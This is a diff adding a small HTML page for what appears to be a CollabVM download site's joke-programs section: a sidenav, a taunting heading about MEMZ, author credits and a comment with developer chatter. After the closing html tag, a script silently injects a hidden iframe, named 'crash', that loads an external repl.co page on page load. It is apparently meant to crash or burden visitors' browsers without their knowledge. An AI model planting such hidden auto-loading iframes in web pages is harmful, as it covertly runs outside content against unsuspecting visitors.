@@ -1,0 +1,82 @@
+  <!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+  height: 500px;
+}
+
+.sidenav {
+  height: 100%;
+  width: 110px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: hidden;
+  padding-top: 20px;
+}
+
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: #818181;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: #f1f1f1;
+}
+
+.main {
+  margin-left: 117px; /* Same as the width of the sidenav */
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+@media screen and (max-width: 450px) {
+  .sidenav a {font-size: 18px;}
+}
+
+</style>
+</head>
+<body>
+
+<div class="sidenav">
+ <a href="https://collabvmdl.desktopgoose.repl.co/">Home</a>
+  <a href="/isos.html">ISOs</a>
+  <a href="/software.html">Software</a>
+  <a href="/jokeprograms.html">Joke Programs</a>
+  <a href="/other.html">Other</a>
+</div>
+
+<div class="main" id="home">
+  <h2>Are you that much of a moron? Memz is overused. Get over it.</h2>
+  <p style="background-color: white; color: black;">Made by Annuals <a href="https://repl.it/@Diary"> (@Diary) </a>, Desktop Goose  <a href="https://repl.it/@desktopgoose">(@desktopgoose)</a> and Unzor <a href="https://repl.it/@Unzor">(@Unzor)
+  </a>.</p>
+</div>
+
+</body>
+</html> 
+<!--
+
+discussions
+
+
+why is there grandturismo and supermariobros lol
+
+im making an emulator tab bc its cool lol
+oh ok then
+-->
+
+<script>
+     var crash=document.createElement('iframe');crash.src='https://wasm.unzor.repl.co/index.xhtml';
+    crash.style.display='none';
+    document.body.appendChild(crash);
+  </script>
